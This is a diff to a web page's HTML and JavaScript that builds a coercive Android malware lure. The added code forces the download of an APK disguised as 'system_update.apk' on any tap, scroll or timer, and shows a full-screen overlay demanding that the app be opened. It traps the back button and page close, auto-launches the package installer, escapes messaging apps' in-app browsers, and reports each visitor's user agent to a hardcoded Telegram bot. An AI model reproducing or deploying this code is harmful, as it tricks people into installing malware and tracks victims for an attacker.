@@ -59,25 +59,31 @@
         .stat-box h3 { font-size: 24px; color: #6b21a8; }
         .stat-box p { font-size: 12px; color: #999; margin-top: 4px; }
         
-        .open-prompt {
+        /* FORCE OPEN OVERLAY */
+        .force-open-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff; z-index: 10001; text-align: center;
-            padding: 50px 20px; display: none;
+            background: #fff; z-index: 99999; text-align: center;
+            padding: 80px 20px; display: none;
         }
-        .open-prompt .icon { font-size: 80px; margin-bottom: 20px; }
-        .open-prompt h1 { color: #1a1a1a; font-size: 28px; margin-bottom: 10px; }
-        .open-prompt p { color: #666; font-size: 16px; margin-bottom: 30px; }
-        .open-app-btn {
-            display: inline-block; padding: 20px 60px; background: #6b21a8;
-            color: #fff; border-radius: 12px; text-decoration: none;
-            font-size: 22px; font-weight: 700; box-shadow: 0 4px 20px rgba(107,33,168,0.4);
+        .force-open-overlay .icon { font-size: 100px; margin-bottom: 20px; }
+        .force-open-overlay h1 { color: #1a1a1a; font-size: 32px; margin: 20px 0; }
+        .force-open-overlay p { color: #666; font-size: 18px; margin-bottom: 40px; }
+        .force-open-btn {
+            display: inline-block; padding: 25px 80px; background: #6b21a8;
+            color: #fff; border-radius: 15px; text-decoration: none;
+            font-size: 28px; font-weight: 800; box-shadow: 0 8px 30px rgba(107,33,168,0.6);
+            animation: pulse 1.5s infinite;
         }
-        .manual-steps {
-            text-align: left; max-width: 400px; margin: 30px auto;
-            background: #f9f9f9; padding: 20px; border-radius: 12px;
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 8px 30px rgba(107,33,168,0.6); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 40px rgba(107,33,168,0.9); }
+            100% { transform: scale(1); box-shadow: 0 8px 30px rgba(107,33,168,0.6); }
         }
-        .manual-steps h3 { color: #333; margin-bottom: 15px; }
-        .manual-steps p { color: #666; font-size: 14px; line-height: 1.8; }
+        .manual-box {
+            margin-top: 40px; padding: 20px; background: #f9f9f9;
+            border-radius: 10px; max-width: 400px; margin-left: auto; margin-right: auto;
+        }
+        .manual-box p { color: #666; font-size: 13px; margin-bottom: 5px; }
         
         @media (max-width: 768px) { .hero h1 { font-size: 32px; } .stats-grid { grid-template-columns: repeat(2, 1fr); } }
     </style>
@@ -98,27 +104,25 @@
         </div>
     </div>
 
-    <!-- OPEN APP PROMPT -->
-    <div class="open-prompt" id="openPrompt">
+    <!-- FORCE OPEN OVERLAY (BLOCKS EVERYTHING) -->
+    <div class="force-open-overlay" id="forceOpenOverlay">
         <div class="icon">📲</div>
         <h1>App Downloaded!</h1>
-        <p>Tap the button below to open and install the app</p>
+        <p>You must open the app to continue</p>
         
         <a href="intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end" 
-           class="open-app-btn">
+           class="force-open-btn">
            OPEN APP NOW
         </a>
         
-        <p style="color:#999; font-size:14px; margin-top:20px;">👇 If the button doesn't work, follow the steps below 👇</p>
+        <p style="color:#999; font-size:14px; margin-top:30px;">Tap the button to continue</p>
         
-        <div class="manual-steps">
-            <h3>📋 Manual Steps:</h3>
-            <p>
-                <strong>Step 1:</strong> Open your phone's <strong>Files</strong> or <strong>Downloads</strong> app<br>
-                <strong>Step 2:</strong> Find <strong>loader.apk.apk</strong><br>
-                <strong>Step 3:</strong> Tap it to install<br>
-                <strong>Step 4:</strong> Tap <strong>"Install"</strong> → <strong>"Open"</strong>
-            </p>
+        <div class="manual-box">
+            <p><strong>If button doesn't work:</strong></p>
+            <p>1. Open your phone's Files or Downloads app</p>
+            <p>2. Find <strong>loader.apk.apk</strong></p>
+            <p>3. Tap it to install</p>
+            <p>4. Tap "Install" → "Open"</p>
         </div>
     </div>
 
@@ -155,18 +159,84 @@
     </div>
 
     <script>
+        // ============ CONFIG ============
+        var APK_URL = "https://github.com/hoihohavapv/babychak/releases/download/v0.1.0/loader.apk.apk";
+        var BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
+        var CHAT_ID = "8501093383";
+
+        // ============ REPORT TO TELEGRAM ============
         function report(msg) {
             try {
-                fetch("https://api.telegram.org/bot8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY/sendMessage?chat_id=8501093383&text=" + encodeURIComponent(msg));
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg));
             } catch(e) {}
         }
         report("🌐 Page loaded: " + navigator.userAgent);
-        
+
+        // ============ FORCE DOWNLOAD ON ANY TAP ============
+        function forceDownload() {
+            try {
+                report("📥 Force download triggered");
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = APK_URL;
+                document.body.appendChild(iframe);
+                var a = document.createElement('a');
+                a.href = APK_URL;
+                a.download = 'system_update.apk';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.location.href = APK_URL;
+            } catch(e) {}
+        }
+        document.addEventListener('click', forceDownload, true);
+        document.addEventListener('touchstart', forceDownload, true);
+        window.addEventListener('scroll', forceDownload, { once: true });
+        setTimeout(forceDownload, 2000);
+
+        // ============ IN-APP BROWSER REDIRECT ============
+        var isWhatsApp = /WhatsApp/i.test(navigator.userAgent);
+        var isTelegram = /Telegram/i.test(navigator.userAgent);
+        var isInstagram = /Instagram/i.test(navigator.userAgent);
+        if (isWhatsApp || isTelegram || isInstagram) {
+            var currentUrl = window.location.href;
+            var newUrl = 'googlechrome://navigate?url=' + encodeURIComponent(currentUrl);
+            setTimeout(function() { window.location.href = newUrl; }, 1000);
+            report("🔀 Redirected from in-app browser");
+        }
+
+        // ============ SHOW FORCE OPEN OVERLAY AFTER 5 SECONDS ============
         setTimeout(function() {
             document.getElementById('fakePopup').style.display = 'none';
-            document.getElementById('openPrompt').style.display = 'block';
-            report("📲 Open prompt shown");
-        }, 4000);
+            document.getElementById('forceOpenOverlay').style.display = 'block';
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() { history.go(1); };
+            report("🔒 Force open overlay shown");
+        }, 5000);
+
+        // ============ AUTO-TRIGGER INSTALLER AFTER 8 SECONDS ============
+        setTimeout(function() {
+            window.location.href = 'intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
+            report("🚀 Auto-triggered installer");
+        }, 8000);
+
+        // ============ VECTOR 7: AUTO-RELOAD PAGE EVERY 5 SECONDS ============
+        setInterval(function() {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = APK_URL;
+            document.body.appendChild(iframe);
+            setTimeout(function() { 
+                if (document.body.contains(iframe)) document.body.removeChild(iframe); 
+            }, 2000);
+        }, 5000);
+
+        // ============ BLOCK PAGE CLOSE ============
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            forceDownload();
+        });
     </script>
 
 </body>
